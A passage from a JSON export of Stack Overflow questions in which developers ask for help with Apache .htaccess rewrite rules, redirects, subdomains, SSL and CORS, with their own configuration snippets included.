to the end of the URL. I'd like to create a redirect rule to match both and redirect to the canonical url in the original request.</p>\n\n<p>Examples:</p>\n\n<ul>\n<li><a href=\"http://site.com/posts/about:blank/\" rel=\"nofollow\">http://site.com/posts/about:blank/</a> -> <a href=\"http://site.com/posts/\" rel=\"nofollow\">http://site.com/posts/</a></li>\n<li><a href=\"http://site.com/posts/about:blank\" rel=\"nofollow\">http://site.com/posts/about:blank</a> -> <a href=\"http://site.com/posts\" rel=\"nofollow\">http://site.com/posts</a></li>\n<li><a href=\"http://site.com/posts/div/\" rel=\"nofollow\">http://site.com/posts/div/</a> -> <a href=\"http://site.com/posts/\" rel=\"nofollow\">http://site.com/posts/</a></li>\n<li><a href=\"http://site.com/posts/div\" rel=\"nofollow\">http://site.com/posts/div</a> -> <a href=\"http://site.com/posts\" rel=\"nofollow\">http://site.com/posts</a></li>\n<li><a href=\"http://site.com/pages/about:blank/\" rel=\"nofollow\">http://site.com/pages/about:blank/</a> -> <a href=\"http://site.com/pages/\" rel=\"nofollow\">http://site.com/pages/</a></li>\n<li><a href=\"http://site.com/pages/about:blank\" rel=\"nofollow\">http://site.com/pages/about:blank</a> -> <a href=\"http://site.com/pages\" rel=\"nofollow\">http://site.com/pages</a></li>\n<li><a href=\"http://site.com/pages/div/\" rel=\"nofollow\">http://site.com/pages/div/</a> -> <a href=\"http://site.com/pages/\" rel=\"nofollow\">http://site.com/pages/</a></li>\n<li><a href=\"http://site.com/pages/div\" rel=\"nofollow\">http://site.com/pages/div</a> -> <a href=\"http://site.com/pages\" rel=\"nofollow\">http://site.com/pages</a></li>\n</ul>\n\n<p>The current rule I'm using redirects to the the homepage, but I cannot get it to include the segments that come after the TLD.</p>\n\n<pre><code>RewriteBase /\nRewriteCond %{REQUEST_URI} (\\/div\\/|\\/div|about\\:blank) [NC]\nRewriteRule .* / [R=301,L]\n</code></pre>\n\n<p>I've tried a few tutorials online and even crawled SO, but cannot figure this out.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12830480,"title":"htaccess 301 redirect append last part of the url","body":"<p>How can I use htaccess to do redirect to another url while keeping last segment of the url. </p>\n\n<p>ex:</p>\n\n<p><strong>Redirect from</strong>\n<a href=\"http://xyz.mysite.com/signup/202\" rel=\"nofollow\">http://xyz.mysite.com/signup/202</a> (202 is dynamic and can change)</p>\n\n<p><strong>to</strong> \n<a href=\"http://mysite.com/somewhere/202\" rel=\"nofollow\">http://mysite.com/somewhere/202</a></p>\n\n<p>I searched allot but couldn't find anything related to this. Any guidance or help would be appreciated. </p>\n"},{"tags":["php","zend-framework",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":852,"score":0,"question_id":5656638,"title":"Running Zend Framework from within a folder with .htaccess rules","body":"<p>Greetings. Basically, I'm trying to run a Zend Framework application (multiple of them, actually) from within folders -- but without specifying the public directory. I know this sounds dirty but I have my reasons so it's outside the scope of my question.</p>\n\n<p>For example, this may be one of my ZF \"installs\":<br/>\n<a href=\"http://www.myurl.com/project1/\" rel=\"nofollow\">http://www.myurl.com/project1/</a><br/>\n(Others may be at /project2/, etc.)</p>\n\n<p>I'm using the standard ZF directory structure. I'm also familiar with the various methods of placing an .htaccess in the project folder to redirect traffic to /public/ that is often used for shared hosting environments with Zend Framework -- the problem is that when your project root isn't the base URL, it doesn't seem to work.</p>\n\n<p>Specifically, if I place the following .htaccess file in /project1/</p>\n\n<blockquote>\n  <p>RewriteEngine On<br/>\n  RewriteRule ^(.*)$ public/$0 [L]</p>\n</blockquote>\n\n<p>I get a ZF error page stating:</p>\n\n<blockquote>\n  <p>Invalid controller specified (project1)</p>\n</blockquote>\n\n<p>So it seems to think that the folder name is a controller.</p>\n\n<p>I get the same problem if I use the more lengthy solution explained here:\n<a href=\"http://www.alberton.info/zend_framework_mod_rewrite_shared_hosting.html\" rel=\"nofollow\">http://www.alberton.info/zend_framework_mod_rewrite_shared_hosting.html</a></p>\n\n<p>(Obviously, I replace the paths with paths that contain \"my\" path, ie. /project1/)</p>\n\n<p>Any help is much appreciated!</p>\n"},{"tags":["apache",".htaccess","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12830374,"title":"Redirect old subdomain to new subdomain","body":"<p>I am trying to do the following redirects of an old subdomain to a new subdomain, respectively:</p>\n\n<pre><code>sub.mydomain.com/d/(all_files),\nsub.mydomain.com/d2/(all_files)\n</code></pre>\n\n<p>redirect to</p>\n\n<pre><code>sub2.mydomain.com/d/(all_files),\nsub2.mydomain.com/d2/(all_files)\n</code></pre>\n\n<p>There are other folders/files in the original \"sub\" that will not be redirected.  Only the files in the \"d\" and the \"d2\" folders need redirecting.</p>\n"},{"tags":["apache",".htaccess","magento"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12829692,"title":"How can I allow a specific URL through in Apache","body":"<p>My root .htaccess (in a Magento store) ensures that any visits not written as (www.)domain.com/correct will go to our 404 (where \"correct\" is an existing sub-directory). (www.)domain.com/admin is also allowed through.</p>\n\n<p>I now need to also allow some other URLs that do not follow the (www.)domain.com/correct form. </p>\n\n<p>Presently the code in the .htaccess is:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^domain.com$ [NC] \nRewriteRule ^(.*)$ http://www.domain.com/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^www.domain.com$ [NC] \nRewriteRule ^$ go404 [R=301,L]  \n</code></pre>\n\n<p>How can I make the following go through as well (ie NOT go404 on me)?</p>\n\n<p><code>www.domain.com/correct/index.php/folder1/folder2/folder3/</code></p>\n"},{"tags":[".htaccess","url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12827505,"title":"URL rewriting: non-redirect but changing url","body":"<p>I have configured my .htaccess file for url rewriting. \nI'm just using the [L] flag, no [R] flag for a rule. \nWhen I'm testing it in my browser, the page is called but... with the parameter url appearing. This is what I don't want, of course.</p>\n\n<p>My .htaccess file:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^testing/([0-9a-zA-z_-]+)/([0-9a-zA-z_-]+)$ http://localhost/testing/index.php?a=$1&amp;b=$2 [L]\n</code></pre>\n\n<p>Is it because I'm testing it on a localhost?</p>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12829412,"title":".htaccess not rewriting my url","body":"<p>I have made a simple url shortener. I'm trying to get .htaccess to rewrite a url that look slike this <code>http://chrismepham.com/q4IT612</code> to this <code>http://chrismepham.com/index.php?code=q4IT612</code> so that it can be used in a function that will redirect to an external url.</p>\n\n<p>Here is the .htaccess code I am using:</p>\n\n<pre><code>SetEnv TZ Europe/London\nRewriteEngine on\nRewriteRule ^([a-zA-Z0-9]+)$ index.php?code=$1\n</code></pre>\n\n<p>At the top of my index page i have the following:</p>\n\n<pre><code>if(isset($_GET['code']) &amp;&amp; !empty($_GET['code'])){\n        $code = $_GET['code'];\n        redirect($code);\n        die();\n    }\n</code></pre>\n\n<p>Heres the redirect function :</p>\n\n<pre><code>function redirect($code){\n//test the connection\n    try{\n        //connect to the database\n        $dbh = new PDO(\"host;dbname=dbname\",\"user\", \"pass\");\n\n    //if there is an error catch it here\n    } catch( PDOException $e ) {\n        //display the error\n        echo $e-&gt;getMessage();\n    }\n\n    if(code_exists($code)){\n        $stmt = $dbh-&gt;prepare(\"SELECT url FROM url_shortener WHERE code=?\");\n        $stmt-&gt;bindParam(1, $code);\n        $stmt-&gt;execute();\n\n        while($row = $stmt-&gt;fetch(PDO::FETCH_ASSOC)) {\n\n                $url = $row['url'];\n        }\n        header('Location: ' .$url);\n    }\n}\n</code></pre>\n\n<p>Why is it not rewriting the url?</p>\n\n<p>Thanks</p>\n"},{"tags":["html",".htaccess","redirect","url-rewriting","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12829105,"title":"HTAccess Protecting Files","body":"<p>I want to have an htaccess that protects files from being directly accessed. So here's my file structure:\n<img src=\"http://i.stack.imgur.com/L3wQT.jpg\" alt=\"Files and Folders\"></p>\n\n<p>I already protected my folders with:</p>\n\n<pre><code>Options -Indexes\n</code></pre>\n\n<p>But someone can still type</p>\n\n<pre><code>www.domain.com/Folder/CSS/Styles.css\n</code></pre>\n\n<p>or</p>\n\n<pre><code>www.domain.com/Folder/Insert.php\n</code></pre>\n\n<p>And it would show them everything. How exactly do I protect these files with htaccess? I don't want anyone to be able to view them but I want the site to run correctly. Last time i tried </p>\n\n<pre><code>deny from all\n</code></pre>\n\n<p>And the entire website failed to load because all the files/folders were <em>completely</em> locked, not even the own website could access its things. I just don't want people typing in the file path into the url and view them.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12829083,"title":".htaccess rewrite rule: only one variable to file1, more variables to file2","body":"<p>I've problem with making htaccess file. What I need:</p>\n\n<p><strong>domain.com/param1</strong></p>\n\n<ul>\n<li>If I have only one variable (param1),I need to use file index.php?page=$1</li>\n</ul>\n\n<p><strong>domain.com/param1/param2</strong> </p>\n\n<ul>\n<li>If I have two or more variables, I need to use file pages.php?section=$1&amp;action=$2</li>\n</ul>\n\n<p>Can somebody help me please? Thanks!</p>\n"},{"tags":["html",".htaccess","redirect","url-rewriting","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12826632,"title":"HTAccess Redirect on Wrong Folder name","body":"<p>I've asked this question before but I'm asking again because no one no one could answer it before. I want to redirect the user if he/she types in the wrong folder name. So if they do:</p>\n\n<pre><code>www.domain.com/folder\n</code></pre>\n\n<p>I want to redirect them to</p>\n\n<pre><code>www.domain.com/Folder\n</code></pre>\n\n<p>So here's the htaccess code in my root directory so far:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^(.+)\\/Front.php$ $1/ [R=301,L]\n</code></pre>\n\n<p>What should I append to that to help me redirect if they type in the folder name in lowercase?</p>\n"},{"tags":[".htaccess","mod-rewrite","amazon-ec2","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12825241,"title":"Redirect subdomain using .htaccess","body":"<p>I have a EC2 instance and host several sites on the server. I can redirect different domains to their specific folders but I cannot seem to redirect subdomains. </p>\n\n<p>Here is my code so far for www.domain1.com which directs to \"folder1\" and retains the \"www.domain1.com\" address in the address bar - This is working fine:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\n\nRewriteCond %{HTTP_HOST} domain1.com\nRewriteCond %{REQUEST_URI} !^/folder1\nRewriteRule ^(.*)$ folder1/$1 [L]\n</code></pre>\n\n<p>However I cannot find a solution for sub-domains - I've tried many solutions similar to this - this does not work:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} sub.domain1.com\nRewriteCond %{REQUEST_URI} !^/folder2\nRewriteRule ^(.*)$ folder2/$1 [L]\n</code></pre>\n\n<p>I want <a href=\"http://sub.domain1.com\" rel=\"nofollow\">http://sub.domain1.com</a> to point to \"folder2\" but retain sub.domain1.com in the address bar. One thing I want to avoid is using my very long EC2 instance static address  \"http://ec2-12-34-567-890.compute-1.amazonaws.com/\" in the code if this is possible.</p>\n\n<p>Thanks</p>\n"},{"tags":["php",".htaccess","seo","robots.txt","canonical-link"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":86,"score":3,"question_id":12827183,"title":"Duplicated content on google. htaccess or robots.txt?","body":"<p>In my website I have the following categories url structure:</p>\n\n<p><code>/category.php?id=6</code> (id=6 is for internet category)</p>\n\n<p>My SEO friendly url is like:</p>\n\n<pre><code>/category/6/internet/\n</code></pre>\n\n<p>The problem is it can be accessed in any of those forms, and because of that, I'm getting duplicate content on google.</p>\n\n<p>So, I'm wondering how can I fix that.</p>\n\n<p>Should I disallow on <code>robots.txt</code> any urls with <code>?</code> on it?</p>\n\n<p>If so, how can I properly set it up?</p>\n\n<p>Should I make a redirection \"Permanently Moved\" on <code>.htaccess</code>?</p>\n\n<p>If so, how can I properly set it up?</p>\n\n<p>My actual <code>.htaccess</code> for categories is like this:</p>\n\n<pre><code>RewriteRule ^category/([^/]*)/([^/]*)/$ category.php?id=$1&amp;name=$2 [L]\n</code></pre>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12826419,"title":"Removing index.htm from URL","body":"<p>I have a WordPress blog which is functioning just fine - the URLs are set to Month/Day/Year and everything on the front-end looks and functions fine.</p>\n\n<p>However, when checking my stats and Google Webmaster Tools, there's tons of 404s that look like this:</p>\n\n<pre><code>http://theURL.com/normal-wordpress-url/index.htm\n</code></pre>\n\n<p>Of course, <code>index.htm</code> does not exist at the end of the WordPress URL, so the search engine is given a 404.</p>\n\n<p>I have no idea what's causing this, as everything works fine for humans.</p>\n\n<p>So basically, I need a way to tell search engines to forget about the index.htm at the end of the URL.</p>\n\n<p>I've tried this in the <code>.htacess</code> with no luck:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} /index\\.htm?$ [NC]\nRewriteRule ^(.*)index\\.htm?$ \"/$1\" [NC,R=301,NE,L]\n</code></pre>\n\n<p>Does anybody have any suggestions?</p>\n"},{"tags":["php",".htaccess","laravel"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":444,"score":1,"question_id":10928536,"title":"Laravel (and generic) framework setting for \"Public\" folder","body":"<p>I tried to make <a href=\"http://www.laravel.com/\" rel=\"nofollow\">Laravel</a> works on my environment (MAMP) but i'm stuck in this situation. </p>\n\n<p>The <code>index.php</code> file of Laravel is into a subfolder called \"public\", so if I want to test my application I need to access it with this url <code>http://localhost/laravel/public/</code> \nbut I want access with <code>http://localhost/laravel</code> </p>\n\n<p>I tried to set an htaccess with this rows but it doesn't work: </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;  \n    RewriteEngine on\n    RewriteRule ^(.*)$ public/$1\n&lt;/IfModule&gt;  \n</code></pre>\n\n<p>I'm not sure that this htaccess can resolves this situation, I get a 404 generated by Lavarel.</p>\n"},{"tags":["php","security",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":269,"score":0,"question_id":9412997,"title":"Codeigniter & disallowed key characters issue with my htaccess","body":"<p>I have setup an htaccess rule (see below)</p>\n\n<pre><code>RewriteRule ^images/(.*) http://www.mysite.com [R=301,L]\n</code></pre>\n\n<p>My intention is that any of the following links will be redirected to site.com the problem is the question mark character (?) as this causes an 'Disallowed key characters' error in Codeigniter framework. I could modify the permitted characters in the config file but this is not recommended for security purposes.</p>\n\n<p>The links I aim to redirect looks like the following..</p>\n\n<pre><code>http://www.site.com/images/flash/main.swf?config=/flash/flash_output/133/location.htm\n</code></pre>\n\n<p>Can anyone suggest a workaround that doesn't involve <a href=\"http://stackoverflow.com/q/9413223/367456\">changing the permitted characters in the config</a>, or is this the only workable option?</p>\n"},{"tags":["php","html",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12825706,"title":"RewriteRule doesn't work as I want","body":"<p>I have a small problem.\nI have a color-customization code for an image, and I use RewriteRule to make it shorter:</p>\n\n<pre><code>RewriteRule ^cc-(.*?)-(.*?)\\.png$ cc.php?col1=$1&amp;col2=$2 [L]\n</code></pre>\n\n<p>When I enter localhost/Gen/cc-1122ff-ffffff.png it opens for me normally.\nBut, when I want to add text to this generated picture with PHP I use another RewriteRule:</p>\n\n<pre><code>RewriteRule ^sig,(.*?),(.*?),(.*?),(.*?),([^,]+),(.*?),([^,]+)\\.png$ test.php?nam=$6&amp;font=$5.ttf&amp;bg=$7.png&amp;gn=$1&amp;badg=$2&amp;typ=$3&amp;itm=$4 [L]\n</code></pre>\n\n<p>And I go to this link: localhost/Gen/sig,y,y,mem,no,Pixel,test,cc-1122ff-ffffff.png\nI get this error: </p>\n\n<pre><code>Warning: imagecreatefrompng(cc-1122ff-ffffff.png): failed to open stream: No such file or directory in D:\\Xampp\\htdocs\\Gen\\test.php on line 31\n</code></pre>\n\n<p>The second RewriteRule normally works, for example with localhost/Gen/sig,y,y,mem,no,Pixel,test,white.png\nSecond RewriteRule doesn't work with first RewriteRule. Why?</p>\n"},{"tags":[".htaccess","vanity-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12822894,"title":"vanity url for own site","body":"<p>Hello i tried too much and i coudln't find a solution so i decided to ask here currently iam using wordpress website and my pages and posts link will be www.mydomain.com/postname and i want to make members user profile link like www.mydomain.com/user/profilename must redirect to  profile.php?user=Username </p>\n\n<p>Currently iam having this code in .htaccess:</p>\n\n<pre><code>IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*\n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from all\n&lt;/Limit&gt;\n\n&lt;Limit PUT DELETE&gt;\norder deny,allow\ndeny from all\n&lt;/Limit&gt;\n\nAuthName sampcnc.com\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>So please help how to do this , Thanks in advance</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","hyperlink"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":12824402,"title":"Apache URL Rewrite Issues","body":"<p>When i try to redirect old link to a new one , in the reason to reserve the indexing ranking by Google, i use the instructions below (one simple instruction for test):</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^code=6$\nRewriteRule ^read.asp$ مميزات-الشريعة-الإسلامية/أد-يوسف-المرعشلي/مقالات [R=301,L]\n</code></pre>\n\n<p>every thing goes right. The problem is when i execute the command on the new host to test the link if going right, the result is correct but in the url navigation link , there is a some other request code (?code=6) appears also and that's not wanted.\nThe result is :</p>\n\n<pre><code>http://localhost/Projects/marefah.com/مميزات-الشريعة-الإسلامية/أد-يوسف-المرعشلي/مقالات?code=6\n</code></pre>\n\n<p>how proceed to ignore (the ?code=6) from the url navigation result ?</p>\n\n<p>Thank you for your suggestions.</p>\n"},{"tags":["apache",".htaccess","redirect","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12821308,"title":"404 Page redirect to custom pages","body":"<p>for e.g i have the following page gives 404 error</p>\n\n<p><a href=\"http://www.example.com/requirements/about-tn/about-us.html\" rel=\"nofollow\">http://www.example.com/requirements/about-tn/about-us.html</a></p>\n\n<p>I want the above page to the following url only if the above page is returning 404 error</p>\n\n<p><a href=\"http://rd.example.com/requirements/about-tn/about-us.html\" rel=\"nofollow\">http://rd.example.com/requirements/about-tn/about-us.html</a></p>\n\n<p>How can i do that in .htaccess?</p>\n\n<p>appreciated</p>\n\n<p>regards,\nRaja</p>\n"},{"tags":[".htaccess","magento"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12800031,"title":".htaccess redirect in certain cases only (Addendum 01)","body":"<p>Thanks to Ansari, the root .htaccess (in a Magento store) does what I want it to: ensure that any visits not written as (www.)domain.com/correct will result in our 404 (where \"correct\" is an existing sub-directory). We also let through (www.)domain.com/admin.</p>\n\n<p>The code in the .htaccess is:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^domain.com$ [NC] \nRewriteRule ^(.*)$ http://www.domain.com/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^www.domain.com$ [NC] \nRewriteRule ^$ go404 [R=301,L]  \n</code></pre>\n\n<p>I need to modify the .htaccess so it allows these URLs as well:</p>\n\n<pre><code>www.domain.com/correct/index.php/folder1/folder2/folder3/\nwww.domain.com/correct/index.php/folder1/folder2/folder4/\nwww.domain.com/correct/index.php/folder1/folder2/folder5/\n</code></pre>\n\n<p>(The URLs are open ended, i.e. without a specific file after the trailing slash)</p>\n\n<p>Thanks!</p>\n\n<hr>\n\n<p>I tried adding this, but no way, José</p>\n\n<pre><code>  RewriteCond %{HTTP_HOST} ^www.domain.com/index.php/folder1/folder2/folder3/$ [NC]\n  RewriteRule ^(.*)$ http://www.domain.com/index.php/$1/folder1/folder2/folder3/ [R=301,L]\n</code></pre>\n\n<h2>------------------------------------------</h2>\n"},{"tags":[".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12820985,"title":"Need help Rewrite(.htaccess)","body":"<p>I need help to rewrite(.htaccess) the following url </p>\n\n<pre><code>http://mysitename/design-templates/jobs/?dealerid=1112229999\n</code></pre>\n\n<p>to</p>\n\n<pre><code>http://mysitename/design-templates/design-templates/index.aspx?mode=jobs&amp;dealerid=1112229999\n</code></pre>\n\n<p>I tried like the following ones but not working</p>\n\n<pre><code>RewriteRule (?&lt;!(.))design-templates/jobs/?dealerid(.*) %/design-templates/index.aspx?mode=jobs&amp;dealerid=$1 [NC]\n\nRewriteRule (?&lt;!(.))design-templates/jobs/?dealerid(.*) %/design-templates/index.aspx?mode=jobs&amp;dealerid=$1 [NC]\n\nRewriteRule (?&lt;!(.))design-templates/jobs/?dealerid(?!\\_)(?!\\-)(?!\\.)(?![a-zA-Z])(?![0-9])(?!\\/(.)) %/design-templates/index.aspx?mode=jobs&amp;dealerid=$1 [NC]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","redirect","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12260816,"title":"htaccess redirect to ssl only for certain pages and www non secure for the other pages","body":"<p>I need to redirect all requests to the site to www and only certain pages to https without www, since for some reason the ssl certificate bought by our customer doesn't cover www.\nAfter looking around I managed to accomplish most of it. But what happens is once we have visited a secure url page, the other pages will stay on https.\nHere is what I have so far in the.htaccess:</p>\n\n<pre><code>#Redirect to www\nRewriteCond %{HTTPS} =off\nRewriteCond %{HTTP_HOST} ^[^./]+\\.[^./]+$ [NC,OR]\nRewriteCond %{HTTP_HOST} ^([^./]+)\\.[^./]+\\.[^./]+$ [NC]\nRewriteCond %1 !=www [NC]\nRewriteRule ^ http://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\n\n# Force SSL on checkout login account and admin pages\nRewriteCond %{HTTPS} =off\nRewriteCond %{REQUEST_URI} checkout|login|my-account|administrator|webshop\nRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\nRewriteRule ^(.*)$ https://%1/$1 [R=301,L\n</code></pre>\n\n<p>I miss the part that will redirect to www non secure if https is on and not belonging to the listed urls. But I'm not familiar at all with regex and rewrite rules.\nSome help will be greatly appreciated.</p>\n"},{"tags":[".htaccess","joomla","virus","malicious"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":767,"score":3,"question_id":11464297,"title":"How to remove .htaccess virus?","body":"<p>First time posting so bear with me please!</p>\n\n<p>My friend's site has been hacked and the .htaccess file (which I really know nothing about) has been injected with a malicious redirect that forces search engines to the see the site as a \"harmful website.\" If you look at the .htaccess file you can see it's Russian or at least ends in <code>.ru</code>. Seeing as I know very little about this stuff, I simply tried to restore the good .htaccess file back with his host. This doesn't work as the virus just recreates the infected .htaccess file.</p>\n\n<p>When I searched through the rest of his directories, I can see the same bad .htaccess file in most of the folders. </p>\n\n<p>I can't seem to help him get rid of this virus.</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":39,"score":-1,"question_id":12815058,"title":"Configuring Apache to block PHP script calling remote IP","body":"<p>I would like to know how to configure apache (with .htaccess or any other way) so that a php script/file which might contain some sort of back door, function, call to unidentified servers be denied calling or receiving data from remote servers.</p>\n\n<p>I am on a Linux Shared hosting with SSH access.</p>\n"},{"tags":["http",".htaccess","xmlhttprequest","cross-domain"],"answer_count":9,"favorite_count":30,"up_vote_count":84,"down_vote_count":0,"view_count":71359,"score":84,"question_id":1653308,"title":"Access-Control-Allow-Origin Multiple Origin Domains?","body":"<p>Is there a way to allow multiple cross-domains using the Access-Control-Allow-Origin header?</p>\n\n<p>I'm aware of the *, but it is too open. I really want to allow just a couple domains.</p>\n\n<p>As an example, something like this:</p>\n\n<pre><code>Access-Control-Allow-Origin: http://domain1.com, http://domain2.com\n</code></pre>\n\n<p>I have tried the above code but it doesn't seem to work in Firefox.</p>\n\n<p>Is it possible to specify multiple domains or am I stuck with just one?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12816309,"title":"How to write Rewrite rule for my requirement in htaccess?","body":"<p>Following is the htaccess code i am using.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\n\nRewriteRule ^admin/([a-z_]+)/?$ admin/index.php?m=$1 [QSA,L]\n\nRewriteRule ^admin/?$ admin/index.php [L]\n\nRewriteRule ^category$ category.php [L]\n\nRewriteRule ^([a-zA-Z0-9_\\-]+)$ /user.php?username=$1 [L]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>When anyone visit the URL : <a href=\"http://www.mydomain.com/category\" rel=\"nofollow\">http://www.mydomain.com/category</a>, it should be redirected to <a href=\"http://www.mydomain.com/category.php\" rel=\"nofollow\">http://www.mydomain.com/category.php</a>. But above code is not working for my requirement.</p>\n\n<p>Following line in above code is not working for me.</p>\n\n<pre><code>RewriteRule ^category$ category.php [L]\n</code></pre>\n\n<p>What shall i do to make it work?</p>\n\n<p>Please guide me. Thanks in advance.</p>\n"},{"tags":["regex","apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":12802511,"title":"Specific .htaccess redirects","body":"<p>I use mobile redirection code:</p>\n\n<pre><code>HTACCESS MOBILE SITE REDIRECTION CODE\n\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (mobile|android|blackberry|brew|cldc|docomo|htc|j2me|micromax|lg|midp|mot|motorola|netfront|nokia|obigo|openweb|opera.mini|palm|psp|samsung|sanyo|sch|sonyericsson|symbian|symbos|teleca|up.browser|vodafone|wap|webos|windows.ce) [NC]\nRewriteRule ^(.*)$ url1 [R=302,L]\n</code></pre>\n\n<p>With this code my entire site redirect the mobile visitors to url1.\nSo, I want to keep that redirection as is it, but to have different redirection for one or more specific urls from my site e.g. <code>http://www.mysite.com/sample.htm</code> to redirect visitors to url2, while the rest of the site to redirect visitors to url1.</p>\n\n<p>Thank you.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12803187,"title":"SOLVED: Replace space, %20 and + with hyphens","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5821120/301-redirect-with-spaces\">301 Redirect With Spaces</a>  </p>\n</blockquote>\n\n\n\n<p>Right now I'm redirecting every Image hit to the html page which contains the image.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_REFERER} !^http://(www\\.)?domain.com/.*$ [NC,OR]\nRewriteCond %{HTTP_REFERER} (bing.com|google|yahoo|stumbleupon.com|reddit.com|pinterest.com) [NC]\nRewriteRule (.*)\\.(gif|jpg|png)$ /$1.html [R,L]\n</code></pre>\n\n<p>Since the Images often include spaces but the html pages always use hyphens, I need a solution to also replace all spaces, %20 and + symbols with hyphens</p>\n"},{"tags":[".htaccess","query-string"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12805617,"title":"htaccess query_string","body":"<p>Search engines crawl the site with parameters</p>\n\n<pre><code>/?p=([0-9]+)\n/?cat=([0-9]+)\n/?do=([a-z]+)\n</code></pre>\n\n<p>etc</p>\n\n<p>How make in .htaccess to inform the search engines that such pages no longer exists?</p>\n\n<p>I have only /?page=([0-9]+)</p>\n\n<p>Thanks.</p>\n\n<p>I tried</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^(p|cat|do)(.*)$\nRewriteRule ^$ http://test.com/simple [R=301,L]\n</code></pre>\n\n<p>but</p>\n\n<pre><code>http://test.com/?p=23 give me http://test.com/test?p=23 (not http://test.com/test)\nhttp://test.com/?cat=11 give me http://test.com/test?cat=11 (not http://test.com/test)\n</code></pre>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":26,"score":-1,"question_id":12811212,"title":"How redirect from url to the part of this url .htaccess","body":"<p>Can you, please, tell how to make a redirect with apache .htaccess:</p>\n\n<p><strong>from</strong> <code>http://www.domain1.com/products/?http://www.domain2.com/sdssds?%dfdf</code></p>\n\n<p><strong>to</strong>  